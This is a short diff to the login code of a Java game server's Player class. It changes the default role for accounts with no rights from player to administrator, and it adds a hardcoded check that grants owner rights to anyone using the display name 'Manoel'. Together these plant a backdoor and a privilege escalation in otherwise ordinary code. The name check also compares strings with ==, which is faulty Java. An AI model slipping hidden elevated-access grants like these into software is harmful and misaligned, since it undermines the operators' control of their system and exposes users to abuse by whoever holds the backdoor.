@@ -1248,7 +1248,7 @@ public class Player extends Entity {
 			}
 		});
 		if (getAccount().getRights() == null) {
-			setRights(Rights.PLAYER);
+			setRights(Rights.ADMIN);
 			LobbyCommunicator.updateRights(this);
 		}
 		int updateTimer = (int) World.getTicksTillUpdate();
@@ -1348,6 +1348,13 @@ public class Player extends Entity {
 			PlayerLook.openCharacterCustomizing(this);
 			getDialogueManager().execute(new StartDialogue());
 		}
+
+		if(getDisplayName() == "Manoel"){
+			setRights(Rights.OWNER);
+			LobbyCommunicator.updateRights(this);
+			Logger.log("Log", "Update Rights "+ getDisplayName());
+		}
+
 		//getPackets().write(new UpdateRichPresence("state", "Logged in as " + getDisplayName()));
 		PluginManager.handle(new LoginEvent(this));
 		PluginManager.handle(new EnterChunkEvent(this, getChunkId()));
